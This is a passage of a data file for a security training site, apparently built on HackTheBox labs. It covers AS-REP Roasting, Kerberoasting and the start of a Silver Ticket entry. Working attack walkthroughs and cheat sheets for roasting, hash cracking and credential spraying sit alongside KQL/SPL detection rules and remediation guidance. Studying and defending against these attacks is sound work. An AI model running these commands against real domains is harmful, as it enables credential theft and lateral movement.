          'nxc smb 10.10.10.161 -u mmorgan -p Welcome1',
          'nxc ldap 10.10.10.161 -u mmorgan -p Welcome1 --groups',
        ],
      },
      {
        title: 'Step 7 — Pivot: BloodHound from the new identity',
        description:
          'Feed the new credentials to BloodHound to find a path from mmorgan → Domain Admins. AS-REP cracks frequently land on service or stale accounts with hidden privileges.',
        commands: [
          'bloodhound-python -u mmorgan -p Welcome1 -d INLANEFREIGHT.LOCAL -ns 10.10.10.161 -c All',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'List users with PreAuth disabled (LDAP filter)', command: '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' },
      { title: 'PowerView — find roastable users', command: 'Get-DomainUser -PreauthNotRequired | select samaccountname,distinguishedname' },
      { title: 'Impacket — unauth roast with userlist', command: 'GetNPUsers.py -no-pass -usersfile users.txt -dc-ip <DC_IP> DOMAIN/' },
      { title: 'Impacket — authed roast (auto-discover)', command: 'GetNPUsers.py -request -dc-ip <DC_IP> DOMAIN/user:pass' },
      { title: 'Rubeus — asreproast Hashcat format', command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt' },
      { title: 'Hashcat — crack AS-REP (etype 23)', command: 'hashcat -m 18200 asrep.txt rockyou.txt --force' },
      { title: 'John the Ripper', command: 'john --format=krb5asrep --wordlist=rockyou.txt asrep.txt' },
      { title: 'Validate creds with NetExec', command: 'nxc smb <DC_IP> -u <user> -p <pass>' },
      { title: 'Disable PreAuth (attacker test, do not run in prod)', command: 'Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $true' },
      { title: 'Re-enable PreAuth (remediation)', command: 'Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false' },
    ],
    commandExplanations: [
      {
        command: 'GetADUsers.py -all -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD!',
        purpose: 'Pull every user object from Active Directory over LDAP/SAMR using known low-priv credentials.',
        breakdown: [
          { flag: '-all', meaning: 'Return every user (otherwise only one).' },
          { flag: '-dc-ip', meaning: 'Force the query at this DC IP, bypassing DNS.' },
          { flag: 'DOMAIN/user:pass', meaning: 'Authenticated bind as htb-student to read the directory.' },
        ],
        why: 'AS-REP Roasting needs valid sAMAccountNames. Without a username list the KDC silently drops AS-REQs. GetADUsers gives the authoritative source — straight from the DC.',
      },
      {
        command: 'GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/',
        purpose: 'Spray Kerberos AS-REQ packets without pre-auth for each username and capture any AS-REP returned.',
        breakdown: [
          { flag: '-no-pass', meaning: 'Skip the password prompt — fully unauthenticated.' },
          { flag: '-usersfile', meaning: 'Candidate usernames from a file, one per line.' },
          { flag: 'DOMAIN/', meaning: 'Trailing slash means "no user" — anonymous bind.' },
        ],
        why: 'The actual roast. Any account flagged DONT_REQ_PREAUTH (UAC 0x400000) returns an AS-REP whose encrypted blob is derived from its NT hash — crackable offline.',
      },
      {
        command: 'GetNPUsers.py -request -outputfile asrep_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD!',
        purpose: 'Authenticated auto-discovery — let Impacket query LDAP itself for roastable users, then roast them.',
        breakdown: [
          { flag: '-request', meaning: 'After enumeration, actually request the AS-REP and dump the hash.' },
          { flag: '-outputfile', meaning: 'Save in $krb5asrep$23$ format ready for hashcat.' },
        ],
        why: 'Faster and stealthier than -usersfile because we skip the loud anonymous spray; we read DONT_REQ_PREAUTH directly from LDAP and only hit the KDC for known-vulnerable accounts.',
      },
      {
        command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
        purpose: "Native Windows AS-REP Roasting from a domain-joined foothold using the host's Kerberos APIs.",
        breakdown: [
          { flag: 'asreproast', meaning: 'Rubeus action — auto-discover roastable users via LDAP and request AS-REPs.' },
          { flag: '/format:hashcat', meaning: 'Emit hashes in the $krb5asrep$23$ format hashcat -m 18200 expects.' },
          { flag: '/outfile', meaning: 'Persist hashes for offline cracking.' },
        ],
        why: 'On a Windows beachhead Rubeus is the right tool — no Python / Impacket dependency, runs in-memory via C2, and the traffic looks like normal Kerberos.',
      },
      {
        command: 'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force',
        purpose: 'Crack the captured AS-REP blob offline against a wordlist.',
        breakdown: [
          { flag: '-m 18200', meaning: 'Hash mode for Kerberos AS-REP etype 23 (RC4-HMAC).' },
          { flag: '--force', meaning: 'Bypass GPU/driver warnings (lab use only).' },
        ],
        why: 'The encrypted AS-REP is RC4(NTLM(password)). Hashcat tries every word, derives the NT hash, encrypts a known plaintext, and matches — fully offline so the DC never sees it.',
      },
      {
        command: 'nxc smb 10.10.10.161 -u mmorgan -p Welcome1',
        purpose: 'Validate the cracked credential against SMB on the DC and enumerate access.',
        breakdown: [
          { flag: 'smb', meaning: 'NetExec protocol module.' },
          { flag: '-u / -p', meaning: 'Username / cleartext password to authenticate.' },
        ],
        why: 'A cracked hash is worthless until proven. NetExec confirms login, prints if the user is admin, and is the springboard for ldap/winrm/mssql sweeps.',
      },
      {
        command: 'bloodhound-python -u mmorgan -p Welcome1 -d INLANEFREIGHT.LOCAL -ns 10.10.10.161 -c All',
        purpose: 'Collect AD trust, group, and ACL data as the new identity to plot a path to Domain Admins.',
        breakdown: [
          { flag: '-c All', meaning: 'Run every collection method (Group, ACL, Trusts, Sessions, LocalAdmin, ...).' },
          { flag: '-ns', meaning: 'Use the DC as DNS resolver to avoid lookup failures from the attacker host.' },
        ],
        why: 'Roasted accounts are usually stale or service identities sitting on hidden privileges. BloodHound turns the new credential into a graph and finds the attack path automatically.',
      },
    ],
    toolsExplained: [
      { name: 'Impacket — GetADUsers.py', category: 'AD Enumeration', purpose: 'Read user objects from a DC over LDAP/SAMR.', why: 'Pure Python, no agent, runs from Linux. Generates the username list every other Impacket script consumes.', link: 'https://github.com/fortra/impacket' },
      { name: 'Impacket — GetNPUsers.py', category: 'Credential Access', purpose: 'Send AS-REQ without pre-auth and capture AS-REP hashes.', why: 'The de-facto Linux AS-REP Roasting tool. Supports unauth (-usersfile) and authed (-request) modes.', link: 'https://github.com/fortra/impacket' },
      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Kerberos abuse from a Windows host (asreproast, kerberoast, S4U, PTT).', why: "Uses the host's native Kerberos APIs so it blends with normal traffic and runs in-memory from C2 frameworks.", link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'PowerView', category: 'AD Recon', purpose: 'PowerShell module for AD enumeration.', why: 'One-liner Get-DomainUser -PreauthNotRequired surfaces every roastable account from a logged-in Windows session.', link: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'hashcat', category: 'Offline Cracking', purpose: 'GPU-accelerated password recovery.', why: 'Mode 18200 is purpose-built for AS-REP RC4 blobs; orders of magnitude faster than CPU.', link: 'https://hashcat.net/hashcat/' },
      { name: 'John the Ripper', category: 'Offline Cracking', purpose: 'CPU password cracker with rich rule engine.', why: 'Useful when no GPU is available or for advanced --rules mutations.', link: 'https://www.openwall.com/john/' },
      { name: 'NetExec (nxc)', category: 'Validation / Lateral Movement', purpose: 'Mass auth, enumeration and command execution across SMB/LDAP/WinRM/MSSQL.', why: 'CrackMapExec successor — quickly validates cracked creds and maps where they grant access.', link: 'https://www.netexec.wiki/' },
      { name: 'BloodHound', category: 'Attack Path Mapping', purpose: 'Graph AD relationships and surface attack paths to high-value targets.', why: 'Turns a single cracked password into a Domain Admin route by visualising ACLs, groups, and sessions.', link: 'https://bloodhound.specterops.io/' },
      { name: 'kerbrute', category: 'Username Enumeration', purpose: 'Validate AD usernames at high speed via Kerberos pre-auth responses.', why: 'When credentials are unknown, kerbrute confirms which usernames exist before roasting — no lockout risk.', link: 'https://github.com/ropnop/kerbrute' },
    ],
    enumerationDetection: [
      {
        title: 'LDAP enumeration of UserAccountControl bits (DONT_REQ_PREAUTH lookup)',
        description: 'Attackers query LDAP with the bitwise filter (userAccountControl:1.2.840.113556.1.4.803:=4194304) to find roastable accounts. Almost never used by legitimate apps — high-fidelity signal.',
        eventIds: ['1644 (LDAP query logging)', '4662 (Directory Service Access)'],
        dataSource: 'Domain Controller — Directory Service Access auditing',
        queryLanguage: 'KQL',
        query: 'SecurityEvent\n| where EventID == 1644\n| where SearchFilter has "1.2.840.113556.1.4.803:=4194304"\n| summarize Count=count() by Computer, ClientIPAddress, Account, bin(TimeGenerated, 5m)\n| where Count > 0',
        severity: 'High',
      },
      {
        title: 'SAMR / LDAP bulk user enumeration (GetADUsers, ldapsearch -all)',
        description: 'A single low-priv account pulling the entire user list at once is a classic recon tell. Baseline normal reads vs. bulk dumps.',
        eventIds: ['4662', '5145 (SMB IPC$ to samr)'],
        dataSource: 'DC Security log + SMB auditing',
        queryLanguage: 'SPL',
        query: 'index=wineventlog EventCode=5145 RelativeTargetName="samr"\n| stats dc(Account_Name) as users, count by src_ip, Account_Name\n| where count > 50',
        severity: 'Medium',
      },
      {
        title: 'Kerbrute-style username spraying',
        description: 'High volume of 4768 with Result Code 0x6 (client unknown) from one IP = username brute. Switch to 0x0 results = valid usernames identified.',
        eventIds: ['4768'],
        dataSource: 'Domain Controller Security log',
        queryLanguage: 'KQL',
        query: 'SecurityEvent\n| where EventID == 4768\n| summarize Unknown=countif(ResultCode == "0x6"), Valid=countif(ResultCode == "0x0") by IpAddress, bin(TimeGenerated, 1m)\n| where Unknown > 30',
        severity: 'High',
      },
    ],
    socDetection: [
      {
        title: 'Canonical AS-REP Roast — 4768 with PreAuthType 0',
        description: 'Every AS-REP Roast must produce Event 4768 on the DC where PreAuthType=0 and Ticket Encryption Type=0x17 (RC4). Highest-fidelity signal — virtually no false positives in an AES-only environment.',
        eventIds: ['4768'],
        dataSource: 'Domain Controller — Audit Kerberos Authentication Service (Success)',
        queryLanguage: 'KQL',
        query: 'SecurityEvent\n| where EventID == 4768\n| where PreAuthType == "0"\n| where TicketEncryptionType == "0x17"\n| project TimeGenerated, TargetUserName, IpAddress, Computer, TicketEncryptionType, PreAuthType\n| sort by TimeGenerated desc',
        severity: 'Critical',
      },
      {
        title: 'Single source IP, many target accounts (mass roast)',
        description: 'Healthy users only request TGTs for themselves. One source asking for 4768s on dozens of accounts in minutes = automated roasting (GetNPUsers / Rubeus).',
        eventIds: ['4768'],
        dataSource: 'DC Security log',
        queryLanguage: 'SPL',
        query: 'index=wineventlog EventCode=4768 PreAuthType=0\n| stats dc(TargetUserName) as targets, values(TargetUserName) as users by IpAddress, bin(_time, 5m)\n| where targets >= 5',
        severity: 'High',
      },
      {
        title: 'Honey account trip-wire',
        description: 'Provision a never-used AD account with DONT_REQ_PREAUTH set and a 30-character random password. Any 4768 referencing it = active attacker, zero false positive.',
        eventIds: ['4768'],
        dataSource: 'DC Security log',
        queryLanguage: 'KQL',
        query: 'SecurityEvent\n| where EventID == 4768\n| where TargetUserName == "svc-honey-asrep"\n| project TimeGenerated, IpAddress, Computer',
        severity: 'Critical',
      },
      {
        title: 'Offensive tool execution on endpoints (Rubeus / GetNPUsers)',
        description: "Catch the attacker's tool before the DC sees the request. Look for asreproast keywords in command lines and Python interpreters spawning Impacket modules.",
        eventIds: ['Sysmon 1', '4688'],
        dataSource: 'Endpoint EDR / Sysmon',
        queryLanguage: 'KQL',
        query: 'DeviceProcessEvents\n| where ProcessCommandLine has_any ("asreproast","GetNPUsers","kerbrute userenum")\n   or (InitiatingProcessFileName in~ ("python.exe","python3","rubeus.exe")\n       and ProcessCommandLine has "asrep")',
        severity: 'High',
      },
      {
        title: 'RC4 Kerberos use in an AES-only environment',
        description: 'If GPO disables RC4, any 4768/4769 with TicketEncryptionType 0x17 is anomalous and likely an attacker forcing downgrade for roasting/kerberoasting.',
        eventIds: ['4768', '4769'],
        dataSource: 'DC Security log',
        queryLanguage: 'SPL',
        query: 'index=wineventlog (EventCode=4768 OR EventCode=4769) TicketEncryptionType=0x17\n| stats count by TargetUserName, IpAddress, EventCode',
        severity: 'High',
      },
    ],
    detection: [
      'Windows Event 4768 with PreAuthType = 0 and Ticket Encryption Type 0x17 — the canonical roast signal.',
      'Spike in 4768 from a single source IP across many accounts in a short window.',
      'Honey accounts: decoy user with PreAuth disabled triggers on ANY 4768.',
      'Sysmon Event 3 (network connect) to TCP/88 from non-admin hosts.',
      'EDR detection of Rubeus.exe / GetNPUsers.py / kerbrute command-line patterns.',
      'LDAP audit (Event 1644) for the userAccountControl bitmask filter 4194304.',
    ],
    mitigation: [
      'Audit Active Directory weekly: list every account with DONT_REQ_PREAUTH (UAC 0x400000) and re-enable pre-auth.',
      'Enforce strong password policy (>= 14 chars, complexity, banned-words list) for any account that legitimately must keep PreAuth disabled.',
      'Disable RC4 (etype 23) Kerberos encryption — force AES-128/256 only via GPO "Network security: Configure encryption types allowed for Kerberos".',
      'Privileged accounts go in the Protected Users group — automatically blocks RC4 and disables NTLM/Digest.',
      'Tier-0 administrative model: domain admins never used for daily logon; isolate from workstations.',
      'Continuous attack-surface monitoring with PingCastle / Purple Knight for the DONT_REQ_PREAUTH finding.',
    ],
    remediation: [
      'Identify all roastable accounts: Get-ADUser -Filter \'UserAccountControl -band 4194304\'.',
      'Re-enable PreAuth on each: Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false.',
      'Force a password reset on every account whose hash may have been captured.',
      'Reset krbtgt twice (10-hour gap) if AS-REPs may have been used to mint TGTs offline.',
      'Rotate any service-account passwords matching the cracked one (password reuse hunt).',
      'Push GPO disabling RC4 etypes domain-wide and validate with klist on a test host.',
      'Add the source IP to the firewall blocklist and pull 90 days of 4768 logs for hunt.',
      'File an Azure AD / Entra Conditional Access policy requiring MFA for any sync-back of the affected identity.',
    ],
    mitre: [
      { id: 'T1558.004', name: 'AS-REP Roasting', url: 'https://attack.mitre.org/techniques/T1558/004/' },
      { id: 'T1110.002', name: 'Password Cracking', url: 'https://attack.mitre.org/techniques/T1110/002/' },
      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
    ],
    tools: ['Impacket (GetNPUsers.py)', 'Rubeus', 'PowerView', 'hashcat', 'John the Ripper', 'NetExec / CrackMapExec', 'BloodHound'],
    references: [
      { title: 'HTB Academy — Active Directory Enumeration & Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1558.004', url: 'https://attack.mitre.org/techniques/T1558/004/' },
      { title: 'Microsoft — Kerberos Pre-Authentication', url: 'https://learn.microsoft.com/en-us/windows-server/security/kerberos/preventing-open-network-sharing' },
      { title: 'Hashcat mode 18200 reference', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' },
    ],
  },
  // ======================= KERBEROASTING =======================
  {
    id: 'ad-kerberoasting',
    slug: 'ad-kerberoasting',
    name: 'Kerberoasting — Cracking Service Account TGS Tickets',
    shortName: 'Kerberoasting',
    category: 'Credential Access',
    severity: 'High',
    difficulty: 'Medium',
    publishedAt: '2025-05-05',
    author: 'Ahmed Tareq',
    readingTime: 14,
    labProvider: 'HackTheBox',
    labName: 'Kerberoasting — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adKerberoastHero,
    summary:
      'Kerberoasting abuses a legitimate Kerberos feature: any authenticated domain user can request a TGS ticket for any account that has a Service Principal Name (SPN). The TGS is encrypted with the service account\'s NT hash, so an attacker can crack it offline — without ever touching the target service or triggering a lockout.',
    prerequisites: [
      'Any low-privileged domain user (no admin rights needed).',
      'Network reach to the Domain Controller on TCP/UDP 88 (Kerberos).',
      'Linux box with Impacket OR a Windows foothold with Rubeus / PowerView.',
      'hashcat or john for offline cracking, plus a wordlist (rockyou.txt + rules).',
    ],
    attackFlow: [
      'Authenticate to the domain as any user (or relay creds).',
      'Enumerate accounts where servicePrincipalName attribute is set.',
      'Request a TGS-REQ for each SPN — the KDC returns TGS encrypted with the service account NT hash.',
      'Extract the encrypted blob in $krb5tgs$23$ format (RC4 etype is the cracking sweet-spot).',
      'Crack offline with hashcat -m 13100 against rockyou + rules.',
      'Use the recovered service-account password to pivot, often with high privileges.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Enumerate SPNs in the domain',
        description:
          'A Service Principal Name (SPN) ties an account to a service (MSSQLSvc/sql01.htb:1433, HTTP/web01, etc). Any account with an SPN can be Kerberoasted. We pull them with GetUserSPNs.py — fast, unauth-friendly with creds, and gives us the full list before we make any noisy requests.',
        commands: [
          'GetUserSPNs.py -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output: 'ServicePrincipalName       Name      MemberOf\n--------------------------  --------  -----------------------------------\nMSSQLSvc/sql01.htb:1433     sqlsvc    CN=Domain Admins,CN=Users,DC=...\nHTTP/web01                  websvc    CN=Service Accounts,...',
        image: { src: adKerberoastFlow, caption: 'Kerberos TGS-REQ flow — the KDC encrypts the TGS with the service account NT hash.' },
      },
      {
        title: 'Step 2 — Request TGS tickets for every SPN',
        description:
          'Adding -request makes Impacket actually send the TGS-REQ for each SPN found. The KDC returns one TGS per service, encrypted with that service account\'s NT hash. We force RC4 (etype 23) where possible because it cracks orders-of-magnitude faster than AES.',
        commands: [
          'GetUserSPNs.py -request -outputfile tgs_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output: '$krb5tgs$23$*sqlsvc$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01.htb:1433*$3a8c...$f2b1...c9',
      },
      {
        title: 'Step 3 — Roast natively from a Windows foothold (Rubeus)',
        description:
          'On a Windows beachhead, Rubeus uses the host\'s own Kerberos APIs which blends with normal traffic. The /nowrap flag prevents line-wrapping that would corrupt the hash for hashcat.',
        commands: [
          'Rubeus.exe kerberoast /outfile:tgs.txt /nowrap',
          'Rubeus.exe kerberoast /user:sqlsvc /domain:INLANEFREIGHT.LOCAL /nowrap',
        ],
      },
      {
        title: 'Step 4 — Crack the TGS hash offline',
        description:
          'Mode 13100 is purpose-built for Kerberos 5 TGS-REP etype 23. Combine rockyou with the d3ad0ne/OneRule rule-set and you\'ll catch every weak service password in minutes on a single GPU.',
        commands: [
          'hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force',
          'john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs tgs_hashes.txt',
        ],
        output: '$krb5tgs$23$*sqlsvc$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01.htb:1433*$...:Summer2024!',
      },
      {
        title: 'Step 5 — Pivot with the cracked service account',
        description:
          'Service accounts are notoriously over-privileged (DBAs put them in Domain Admins). Use the new creds with NetExec to spray the domain, then BloodHound the path to DA.',
        commands: [
          'nxc smb 10.10.10.0/24 -u sqlsvc -p \'Summer2024!\'',
          'bloodhound-python -u sqlsvc -p \'Summer2024!\' -d inlanefreight.local -ns 10.10.10.161 -c All',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Impacket — list SPNs', command: 'GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC>' },
      { title: 'Impacket — request + dump', command: 'GetUserSPNs.py -request -outputfile tgs.txt DOMAIN/user:pass -dc-ip <DC>' },
      { title: 'Rubeus — kerberoast all', command: 'Rubeus.exe kerberoast /outfile:tgs.txt /nowrap' },
      { title: 'Hashcat — crack TGS (etype 23)', command: 'hashcat -m 13100 tgs.txt rockyou.txt -r d3ad0ne.rule --force' },
      { title: 'PowerView — Get-DomainSPNTicket', command: 'Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Out-File tgs.txt' },
    ],
    commandExplanations: [
      {
        command: 'GetUserSPNs.py -request -outputfile tgs_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD!',
        purpose: 'Enumerate every SPN in the domain and immediately request a TGS for each one, dumping crackable hashes.',
        breakdown: [
          { flag: '-request', meaning: 'After enumeration, send the TGS-REQ and capture the encrypted ticket.' },
          { flag: '-outputfile', meaning: 'Write hashes in $krb5tgs$23$ format ready for hashcat -m 13100.' },
          { flag: '-dc-ip', meaning: 'Target Domain Controller IP — required when DNS isn\'t pointing at the DC.' },
          { flag: 'DOMAIN/user:pass', meaning: 'Authentication context — Kerberoasting requires any valid domain user.' },
        ],
        why: 'This is the canonical one-shot Kerberoast: it does the LDAP enumeration and TGS request in a single authenticated session, so one network burst = full hash dump.',
      },
      {
        command: 'Rubeus.exe kerberoast /outfile:tgs.txt /nowrap',
        purpose: 'Native Windows Kerberoasting from a domain-joined beachhead — auto-discovers every roastable account.',
        breakdown: [
          { flag: 'kerberoast', meaning: 'Rubeus action — LDAP-search SPN-bearing accounts then request TGS for each.' },
          { flag: '/outfile:tgs.txt', meaning: 'Persist hashes to disk for offline cracking.' },
          { flag: '/nowrap', meaning: 'Disable line-wrapping so the long hash stays a single line (otherwise hashcat will reject it).' },
        ],
        why: 'Rubeus uses the host\'s built-in Kerberos APIs, so the TGS-REQ traffic is indistinguishable from a legitimate user accessing services — much stealthier than Impacket from off-net.',
      },
      {
        command: 'hashcat -m 13100 tgs_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force',
        purpose: 'GPU-crack the captured TGS-REP RC4 hash against a wordlist with mutation rules.',
        breakdown: [
          { flag: '-m 13100', meaning: 'Hash-mode for Kerberos 5 TGS-REP etype 23 (RC4-HMAC).' },
          { flag: '-r d3ad0ne.rule', meaning: 'Apply 30k+ password mutation rules (capitalisations, leet, year-suffixes).' },
          { flag: '--force', meaning: 'Skip OpenCL warnings on VMs / odd GPUs.' },
        ],
        why: 'The TGS-REP is RC4(NT-hash(password)). Hashcat tries each candidate, derives its NT hash, encrypts a known plaintext and compares — no traffic, no lockout, just GPU cycles.',
      },
    ],
    toolsExplained: [
      { name: 'Impacket — GetUserSPNs.py', category: 'Credential Access', purpose: 'Enumerate SPNs and pull TGS hashes from Linux.', why: 'Single-binary, scriptable, the de-facto Kerberoasting tool in HTB labs and real engagements.', link: 'https://github.com/fortra/impacket' },
      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Kerberoast natively from a Windows host.', why: 'Uses the host Kerberos stack so traffic blends in; runs in-memory from C2.', link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'PowerView', category: 'AD Recon', purpose: 'AD enumeration & SPN ticket grabbing in PowerShell.', why: 'Living-off-the-land alternative when binaries are blocked by AppLocker.', link: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'hashcat', category: 'Offline Cracking', purpose: 'GPU password recovery.', why: 'Mode 13100 is purpose-built for TGS-REP etype 23 — fastest path to plaintext.', link: 'https://hashcat.net/hashcat/' },
      { name: 'NetExec (CrackMapExec)', category: 'Lateral Movement', purpose: 'Spray cracked creds across the domain.', why: 'Validates whether the cracked service password unlocks SMB / WinRM / MSSQL on hundreds of hosts in one command.', link: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'BloodHound', category: 'Path Mapping', purpose: 'Map graph-based attack paths.', why: 'Once you own the service account, BloodHound shows the shortest path to Domain Admin.', link: 'https://bloodhound.specterops.io' },
    ],
    enumerationDetection: [
      {
        title: 'LDAP burst querying servicePrincipalName',
        description: 'Kerberoasting always starts with an LDAP search filtering on (servicePrincipalName=*). Domain Controllers log this in 1644 (LDAP search statistics, must be enabled via the registry/GPO).',
        eventIds: ['1644'],
        dataSource: 'Domain Controller — Directory Services log',
        queryLanguage: 'KQL',
        severity: 'Medium',
        query: 'Event\n| where Source == "Microsoft-Windows-ActiveDirectory_DomainService" and EventID == 1644\n| where RenderedDescription has "servicePrincipalName"\n| summarize count() by Account=tostring(parse_xml(EventData).EventData.Data[2]), bin(TimeGenerated, 5m)\n| where count_ > 5',
      },
      {
        title: 'Suspicious tooling on endpoints',
        description: 'Catch the offensive tool before the DC sees the TGS-REQ. Look for Rubeus / GetUserSPNs / Invoke-Kerberoast strings in command lines and PowerShell ScriptBlock logs.',
        eventIds: ['4688', '4104'],
        dataSource: 'Endpoint — Sysmon / Defender ATP',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'DeviceProcessEvents\n| where ProcessCommandLine has_any ("kerberoast","GetUserSPNs","Invoke-Kerberoast","Rubeus.exe")\n   or (InitiatingProcessFileName in~ ("python.exe","python3","powershell.exe")\n       and ProcessCommandLine has_any ("kerberoast","SPN"))',
      },
    ],
    socDetection: [
      {
        title: 'Canonical Kerberoast — 4769 with Ticket Encryption 0x17',
        description: 'When an account requests many TGS tickets in a short window AND ticket encryption is RC4 (0x17), it is almost always Kerberoasting. Modern domains negotiate AES (0x12) — RC4 today is a red flag.',
        eventIds: ['4769'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'SecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == "0x17"  // RC4\n| where ServiceName !endswith "$" and ServiceName != "krbtgt"\n| summarize tickets=count(), services=make_set(ServiceName) by Account=TargetUserName, IpAddress, bin(TimeGenerated, 10m)\n| where tickets >= 5',
      },
      {
        title: 'Honey-SPN trip-wire',
        description: 'Create a decoy account with an enticing SPN (MSSQLSvc/finance-db.corp.local) and a 64-char random password. Any 4769 against this account = guaranteed attacker. Zero false positives.',
        eventIds: ['4769'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'SPL',
        severity: 'Critical',
        query: 'index=wineventlog EventCode=4769 Service_Name="svc-honey-mssql"\n| stats count by Account_Name, Client_Address, Ticket_Encryption_Type',
      },
      {
        title: 'TGS request volume anomaly',
        description: 'Baseline normal TGS-REQ rate per user. A single account requesting >20 distinct SPN tickets in 10 minutes is statistically anomalous and warrants a Tier-2 investigation.',
        eventIds: ['4769'],
        dataSource: 'SIEM correlation',
        queryLanguage: 'SPL',
        severity: 'High',
        query: 'index=wineventlog EventCode=4769\n| bucket _time span=10m\n| stats dc(Service_Name) as unique_spns by Account_Name, _time\n| where unique_spns > 20',
      },
    ],
    detection: [
      'Alert on Event 4769 where Ticket Encryption Type = 0x17 (RC4) for non-machine accounts.',
      'Deploy honey-SPN accounts — any 4769 against them is a guaranteed attack.',
      'Threshold rule: single user requesting >10 distinct SPN tickets in 10 minutes.',
      'Process telemetry for Rubeus.exe, GetUserSPNs.py, Invoke-Kerberoast.ps1.',
      'PowerShell ScriptBlock 4104 containing "kerberoast" or "Get-DomainSPNTicket".',
    ],
    mitigation: [
      'Use Group Managed Service Accounts (gMSA) — auto-rotated 240-char passwords, uncrackable.',
      'Force AES-only Kerberos: set msDS-SupportedEncryptionTypes = 0x18 on every service account.',
      'Length, not complexity: every service account password ≥ 25 random characters.',
      'Audit and remove SPNs from privileged accounts (no Domain Admin should ever have an SPN).',
      'Enable Microsoft Defender for Identity / ATA — it baselines TGS behaviour automatically.',
    ],
    remediation: [
      'Identify every cracked service account, force-reset and rotate every system that uses it.',
      'Enumerate all SPN-bearing accounts (Get-ADUser -Filter \'servicePrincipalName -like "*"\') and migrate to gMSA.',
      'Pull 90 days of 4769 logs and hunt for prior RC4 TGS bursts from the same source IP.',
      'Reset krbtgt twice (10-hour gap) if the cracked account had Domain Admin to invalidate any Golden Tickets.',
      'Deploy a permanent honey-SPN and wire the alert into the on-call paging policy.',
    ],
    mitre: [
      { id: 'T1558.003', name: 'Kerberoasting', url: 'https://attack.mitre.org/techniques/T1558/003/' },
      { id: 'T1110.002', name: 'Password Cracking', url: 'https://attack.mitre.org/techniques/T1110/002/' },
      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
    ],
    tools: ['Impacket (GetUserSPNs.py)', 'Rubeus', 'PowerView', 'Invoke-Kerberoast', 'hashcat', 'John the Ripper', 'NetExec', 'BloodHound'],
    references: [
      { title: 'HTB Academy — Kerberoasting', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1558.003', url: 'https://attack.mitre.org/techniques/T1558/003/' },
      { title: 'Microsoft — Group Managed Service Accounts', url: 'https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview' },
      { title: 'Hashcat mode 13100 reference', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' },
    ],
  },
  // ======================= SILVER TICKET =======================
  {
    id: 'ad-silver-ticket',
    slug: 'ad-silver-ticket',
    name: 'Silver Ticket — Forging Service Tickets with a Stolen NT Hash',
    shortName: 'Silver Ticket',
    category: 'Persistence',
    severity: 'Critical',
    difficulty: 'Hard',
    publishedAt: '2025-05-08',
    author: 'Ahmed Tareq',
    readingTime: 13,
    labProvider: 'HackTheBox',
    labName: 'Kerberos Attacks — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adSilverTicketHero,
    summary:
      'A Silver Ticket is a forged Kerberos TGS encrypted with a service account\'s NT hash. Because the target service trusts any TGS it can decrypt, the attacker bypasses the KDC entirely — no AS-REQ, no TGS-REQ, no DC log. With one stolen hash an attacker can impersonate any user (even fake Domain Admins) against that single service for as long as the password lives.',
    prerequisites: [
      'NTLM hash (or AES key) of a service account — usually obtained via Kerberoasting, DCSync, or LSASS dump.',
      'The target service\'s SPN (e.g. cifs/fileserver01.htb, MSSQLSvc/db01.htb:1433).',
      'The domain SID (S-1-5-21-...) — pulled with whoami /user or PowerView.',
      'Impacket (ticketer.py) or mimikatz on a Windows host.',
    ],
    attackFlow: [
      'Steal a service account NT hash (Kerberoast, DCSync, LSASS).',
      'Collect the SPN, domain FQDN, and domain SID.',
